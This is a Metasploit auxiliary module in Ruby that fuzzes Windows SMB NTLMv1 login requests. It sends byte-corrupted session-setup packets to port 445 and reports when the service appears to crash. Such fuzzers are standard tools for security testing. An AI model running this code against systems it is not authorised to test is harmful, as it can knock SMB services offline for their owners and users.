##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SMB
  include Msf::Auxiliary::Fuzzer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SMB NTLMv1 Login Request Corruption',
      'Description'    => %q{
        This module sends a series of SMB login requests using
      the NTLMv1 protocol with corrupted bytes.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE
    ))
    register_options([
      Opt::RPORT(445),
      OptInt.new('MAXDEPTH', [false, 'Specify a maximum byte depth to test'])
    ], self.class)
  end

  def do_smb_login(pkt,opts={})
    @connected = false
    connect
    simple.client.negotiate(false)

    @connected = true
    sock.put(pkt)
    sock.get_once(-1, opts[:timeout])
  end

  def run
    last_str = nil
    last_inp = nil
    last_err = nil

    pkt = make_smb_login
    cnt = 0

    max = datastore['MAXDEPTH'].to_i
    max = nil if max == 0
    tot = ( max ? [max,pkt.length].min : pkt.length) * 256

    print_status("Fuzzing SMB login with #{tot} requests")
    fuzz_string_corrupt_byte_reverse(pkt,max) do |str|
      cnt += 1

      if(cnt % 100 == 0)
        print_status("Fuzzing with iteration #{cnt}/#{tot} using #{@last_fuzzer_input}")
      end

      begin
        r = do_smb_login(str, 0.25)
      rescue ::Interrupt
        print_status("Exiting on interrupt: iteration #{cnt} using #{@last_fuzzer_input}")
        raise $!
      rescue ::Exception => e
        last_err = e
      ensure
        disconnect
      end

      if(not @connected)
        if(last_str)
          print_status("The service may have crashed: iteration:#{cnt-1} method=#{last_inp} string=#{last_str.unpack("H*")[0]} error=#{last_err}")
        else
          print_status("Could not connect to the service: #{last_err}")
        end
        return
      end

      last_str = str
      last_inp = @last_fuzzer_input
    end
  end

  def make_smb_login

    user = "USER"
    domain = "DOMAIN"
    hash_lm = Rex::Proto::NTLM::Crypt.lanman_des("X", "X" * 8)
    hash_nt = Rex::Proto::NTLM::Crypt.ntlm_md4("X", "X" * 8)

    data = ''
    data << hash_lm
    data << hash_nt
    data << user + "\x00"
    data << domain + "\x00"
    data << 'Windows 2000 2195' + "\x00"
    data << 'Windows 2000 5.0' + "\x00"

    pkt = Rex::Proto::SMB::Constants::SMB_SETUP_NTLMV1_PKT.make_struct

    pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_SESSION_SETUP_ANDX
    pkt['Payload']['SMB'].v['Flags1'] = 0x18
    pkt['Payload']['SMB'].v['Flags2'] = 0x2001
    pkt['Payload']['SMB'].v['WordCount'] = 13
    pkt['Payload'].v['AndX'] = 255
    pkt['Payload'].v['MaxBuff'] = 0xffdf
    pkt['Payload'].v['MaxMPX'] = 2
    pkt['Payload'].v['VCNum'] = 1
    pkt['Payload'].v['PasswordLenLM'] = hash_lm.length
    pkt['Payload'].v['PasswordLenNT'] = hash_nt.length
    pkt['Payload'].v['Capabilities'] = 64
    pkt['Payload'].v['Payload'] = data
    pkt.to_s
  end
end
